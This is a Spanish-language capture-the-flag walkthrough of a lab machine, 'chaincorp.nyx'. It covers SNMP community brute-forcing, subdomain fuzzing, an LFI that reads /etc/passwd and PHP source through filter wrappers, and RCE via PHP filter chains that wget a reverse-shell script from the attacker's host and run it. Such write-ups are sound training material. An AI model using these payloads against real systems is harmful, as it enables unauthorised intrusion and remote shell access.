Hacemos el escaneo de nmap:
![[Pasted image 20231120191445.png]]
Y esto es lo que corre por el puerto 80:
![[Pasted image 20231120191527.png]]
Y si ejecutamos un strings a la imagen nos encontramos con un id_rsa:
![[Pasted image 20231120191615.png]]
Pero esto no lleva a ningún lado; por lo que seguimos investigando y si probamos en hacer un escaneo de puertos por el protocolo UDP, vemos que el puerto 161 está abierto:
![[Pasted image 20231120191823.png]]
Antes de nada, hay que entender qué es el protocolo snmp:

- (SNMP) es un protocolo de capa de aplicación que facilita el intercambio de información de administración entre dispositivos de red
- La herramienta Onesixtyone es una herramienta de administración de red basada en SNMP que se utiliza para recopilar y analizar datos de dispositivos de red.
- En el contexto de SNMP, una community key es una cadena de caracteres que se utiliza para autenticar el acceso a un dispositivo de red.
Si buscamos en internet cómo enumerar el servicio snmp, tenemos una herramienta llamada onesixtyone usando el siguiente diccionario:
```
https://github.com/hackingyseguridad/diccionarios/blob/master/usuarios.txt
```
![[Pasted image 20231120192239.png]]
Este diccionario lo utilizaremos con onesixtyone de la siguiente forma:
```
onesixtyone -c usuarios.txt 192.168.0.25
```
Y vemos que nos encuentra la community key llamada security. La cadena de comunidad actúa como una especie de contraseña que permite a los dispositivos de gestión SNMP comunicarse con los agentes SNMP en los dispositivos gestionados: 
![[Pasted image 20231120192506.png]]
Ahora con esta contraseña, podemos enumerar este protocolo con snmpwalk, donde utilizaremos el siguiente comando que utilizará la versión 2c y la cadena de comunidad security:
```
snmpwalk -v 2c -c security 192.168.0.25
```
Y nos encontramos un dominio:
![[Pasted image 20231120192822.png]]
Que lo añadiremos al /etc/hosts:
![[Pasted image 20231120192905.png]]
Y vamos a hacer una búsqueda de subdominios con wfuzz:
```python
wfuzz -c --hc=404 --hl=11 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H "Host: FUZZ.chaincorp.nyx" -u 192.168.0.25
```
Y encontramos el subdominio utils, por lo que añadimos utils.chaincorp.nyx al /etc/hosts:
![[Pasted image 20231120193133.png]]
![[Pasted image 20231120194141.png]]
Y esto es lo que tenemos, una web donde podemos ejecutar comandos:
![[Pasted image 20231120194214.png]]
![[Pasted image 20231120194250.png]]
Y por aquí podemos explotar un LFI de una forma muy básica:
```
http://utils.chaincorp.nyx/include.php?in=../../../../../../etc/passwd
```
![[Pasted image 20231120194330.png]]
No obstante, podemos intentar leer el fichero include.php, que lo vemos dentro de la url pero en un principio no podemos leerlo, por lo que podemos usar un wrapper, que podemos extraerlo de este repositorio de github:
```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#local-file-inclusion
```
![[Pasted image 20231120194607.png]]
Lo aplicamos y nos devuelve el contenido de este archivo codificado en base64:
```
http://utils.chaincorp.nyx/include.php?in=php://filter/convert.base64-encode/resource=include.php
```
![[Pasted image 20231120194706.png]]
Y vemos que efectivamente podemos bypassear el lfi y leer el contenido de cualquier fichero:
![[Pasted image 20231120194752.png]]
Existe una tool llamada php_filet_chain_generator que nos permite ejecutar un comando a partir de un LFI conocido, la cual podemos encontrarla en el siguiente repositorio de github:
```
https://github.com/synacktiv/php_filter_chain_generator
```
Y aquí tenemos sus instrucciones de uso:
![[Pasted image 20231120195055.png]]
Lo ejecutamos pero en la parte del php le metemos un comando, por ejemplo el comando ls -l:
```bash
python3 php_filter_chain_generator.py --chain "<?php system('ls -l'); ?>"
```
![[Pasted image 20231120195245.png]]
Pegamos todo esto a partir del php?in= y vemos que se ejecuta el comando:
![[Pasted image 20231120195326.png]]
En este punto lo que haremos será compartir la reverse shell dentro de un index.html desde python, y dentro del payload tenemos que usar wget primero para descargarlo:
![[Pasted image 20231129132004.png]]
```bash
python3 php_filter_chain_generator.py --chain "<?php system('wget 192.168.0.24'); ?>"
```
![[Pasted image 20231129132036.png]]
Y si lanzamos un ls, ahora el archivo está dentro de la máquina, por lo que ejecutamos el siguiente otro payload para ejecutar dicho archivo:
![[Pasted image 20231129132131.png]]
Por tanto ahora ya podemos ejecutar este archivo y obtener la reverse shell:
```bash
python3 php_filter_chain_generator.py --chain "<?php system('bash index.html.3'); ?>"
```
![[Pasted image 20231129132243.png]]
![[Pasted image 20231129132323.png]]
Y habremos recibido la conexión:
![[Pasted image 20231129132337.png]]
